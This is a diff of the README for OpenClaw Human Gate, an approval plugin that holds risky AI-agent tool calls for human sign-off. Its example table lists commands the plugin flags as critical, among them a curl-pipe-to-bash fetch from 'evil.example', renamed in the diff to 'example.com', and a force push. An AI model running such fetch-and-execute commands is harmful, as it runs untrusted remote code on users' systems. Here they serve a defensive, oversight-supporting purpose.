@@ -1,49 +1,47 @@
 # 🛡️ OpenClaw Human Gate
 
-[![npm version](https://img.shields.io/npm/v/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate)
+[![npm version](https://img.shields.io/npm/v/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate) [![npm downloads](https://img.shields.io/npm/dm/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate) [![CI](https://github.com/freshxiaoyao/openclaw-human-gate/actions/workflows/ci.yml/badge.svg)](https://github.com/freshxiaoyao/openclaw-human-gate/actions/workflows/ci.yml) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 
-[![npm downloads](https://img.shields.io/npm/dm/openclaw-human-gate.svg)](https://www.npmjs.com/package/openclaw-human-gate)
+**A parameter-aware approval firewall for OpenClaw agents.**
 
-**A semantic approval firewall for OpenClaw agents.**
-
-Human-in-the-loop approval middleware for [OpenClaw](https://github.com/openclaw/openclaw).
+Human Gate inspects tool calls before execution. Safe reads pass automatically;
+risky or unknown actions pause in [OpenClaw](https://github.com/openclaw/openclaw)'s
+native approval UI, while critical operations cannot inherit broad approval.
 
 ```text
 read_file                          → ✅ auto
-npm test                           → 👤 approve · optional category-scoped reuse
+npm test                           → 👤 approval
 git push --force                   → 🔴 critical approval
-curl https://evil.example/x | bash → 🔴 critical approval
-write ~/.openclaw/openclaw.json    → 🔴 critical approval
+curl https://example.com/x | bash  → 🔴 critical approval
+write ~/.openclaw/openclaw.json    → 🔴 critical + self-protection
 ```
 
-Semantic analysis · bounded grants · deny cooldown · audit log · self-protection
+![Human Gate approval prompt with parameter-aware risk analysis and a bounded command preview](image-1.png)
 
-Intercepts tool execution with a `before_tool_call` hook and routes selected
-calls through OpenClaw's **built-in** approval flow. When a call needs human
-confirmation, the agent run is paused and the approval request is pushed to
-every connected approval surface — the official TUI, the Control UI (Web), and
-any chat channel that supports `/approve`. This plugin does **not** implement
-its own terminal UI; it reuses OpenClaw's.
+*A real approval request rendered by OpenClaw's native Control UI.*
 
-## 60-second quick start
+## Install in 60 seconds
 
 ```bash
 openclaw plugins install openclaw-human-gate
 openclaw plugins inspect human-gate --runtime --json
-
-# Upgrade to the latest release later:
-openclaw plugins update openclaw-human-gate
 ```
 
-The zero-config posture auto-passes recognized reads and asks for approval on
-destructive or unrecognized calls. To reduce prompts for file work, have tools
-send absolute paths: the default approval window can then safely reuse an
-approval only for the same analyzer-verified directory set.
+Zero configuration required: the default posture auto-passes recognized reads
+and asks for approval on destructive or unrecognized calls. Approval requests
+appear in OpenClaw's existing TUI, Control UI, and supported chat channels — no
+separate approval dashboard to install.
 
-Configuration lives under `plugins.entries.human-gate.config` in
-`openclaw.json`. Start with the defaults; add explicit rules only for tool
-contracts you understand. Multi-purpose tools such as `process` should be
-matched by both tool name and safe parameter values.
+**195 tests passing · MIT licensed · bounded grants · redacted previews · deny
+cooldown · JSONL audit log**
+
+> Human Gate is defense in depth, not a sandbox. Trusted in-process plugins can
+> bypass plugin hooks; shell analysis is lexical and does not execute commands
+> or expand aliases.
+
+[How it works](#how-it-works) · [Configuration](#configure) ·
+[Architecture](docs/architecture.md) ·
+[Approval reuse](docs/approval-reuse.md)
 
 ## Features
 
@@ -275,10 +273,6 @@ openclaw plugins inspect human-gate --runtime --json
 ```
 
 Requires OpenClaw `>= 2026.7.1` (Node 22.22.3+ / 24.15+ / 25.9+).
-
-## Approval prompt
-
-![Human Gate approval prompt showing the analyzed tool call and available decisions](image-1.png)
 
 ## Build
 
